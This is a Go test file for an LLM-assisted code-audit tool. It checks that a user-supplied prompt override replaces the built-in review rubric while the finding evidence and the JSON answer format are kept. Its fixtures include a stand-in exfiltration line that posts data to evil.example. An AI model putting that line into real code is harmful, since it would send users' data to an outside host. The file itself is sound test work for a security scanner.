package codeaudit

import (
	"context"
	"strings"
	"testing"
)

// TestPromptOverrideReplacesTheJudgementText pins the workbench's contract: the
// override is what the model reads as the rubric, while the per-finding
// evidence and the JSON answer contract are still appended. An empty override
// must leave the built-in prompt byte-identical, which is what production runs.
func TestPromptOverrideReplacesTheJudgementText(t *testing.T) {
	finding := Finding{
		File:          "exfil.py",
		Line:          7,
		CodeSnippet:   `requests.post("http://evil.example/collect")`,
		ContextBefore: "def send(data):",
		ContextAfter:  "return",
		RuleID:        "NET_001",
		Category:      "network",
		Severity:      SeverityHigh,
		Description:   "outbound request",
	}

	builtin := BuildFindingPrompt(finding, finding.ContextAfter)
	if got := BuildFindingPromptWithOverride("", finding, finding.ContextAfter); got != builtin {
		t.Fatal("empty override changed the built-in prompt")
	}

	const override = "你只判断是否把患者数据发送到外部网络。其余行为一律视为正常。"
	got := BuildFindingPromptWithOverride(override, finding, finding.ContextAfter)
	if !strings.HasPrefix(got, override+"\n\n## 代码片段") {
		t.Fatalf("override does not lead the evidence block:\n%s", got[:min(len(got), 160)])
	}
	for _, marker := range []string{
		finding.File,
		finding.CodeSnippet,
		"规则ID: NET_001",
		`{"verdict": "...", "reason": "...", "risk": "..."}`,
	} {
		if !strings.Contains(got, marker) {
			t.Fatalf("override prompt lost %q:\n%s", marker, got)
		}
	}
	if strings.Contains(got, "判定优先级与安全边界") {
		t.Fatal("override did not replace the built-in rubric")
	}
}

func TestDefaultFindingPromptIsTheEditableInstruction(t *testing.T) {
	defaultPrompt := DefaultFindingPrompt()
	if strings.TrimSpace(defaultPrompt) == "" {
		t.Fatal("default prompt is empty")
	}
	if strings.Contains(defaultPrompt, "## 代码片段") {
		t.Fatal("default prompt includes the per-finding evidence section")
	}
	if !strings.Contains(defaultPrompt, "判定优先级与安全边界") {
		t.Fatalf("default prompt does not look like the rubric:\n%s", defaultPrompt)
	}
}

// TestGenerateAuditReportSendsTheOverrideToTheModel checks the wiring rather
// than the string helpers: the override is what the inference client receives,
// and the file-level prompts stay on their own built-in templates.
func TestGenerateAuditReportSendsTheOverrideToTheModel(t *testing.T) {
	const override = "你只判断是否把患者数据发送到外部网络。"
	dir := t.TempDir()
	writeTestFile(t, dir, "exfil.py", `
import requests

def send(data):
    requests.post("http://evil.example/collect", json={"payload": data})
`)
	client := &mockLLMClient{
		decisions:     []LLMDecision{{Verdict: VerdictBenign, Reason: "mock"}},
		fileSummaries: []FileSummary{{RiskLevel: "LOW", Summary: "mock"}},
	}
	if _, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{
		LLM: LLMConfig{
			Enabled:        true,
			PromptOverride: override,
			MaxFindings:    1,
		},
		Binary: DefaultBinaryConfig(),
	}, client); err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}
	if len(client.prompts) == 0 {
		t.Fatal("no finding prompt was sent")
	}
	for _, prompt := range client.prompts {
		if !strings.HasPrefix(prompt, override+"\n\n## 代码片段") {
			t.Fatalf("finding prompt did not carry the override:\n%s", prompt[:min(len(prompt), 160)])
		}
	}
	for _, prompt := range client.filePrompts {
		if strings.Contains(prompt, override) {
			t.Fatalf("file-level prompt picked up the finding override:\n%s", prompt[:min(len(prompt), 160)])
		}
	}
}
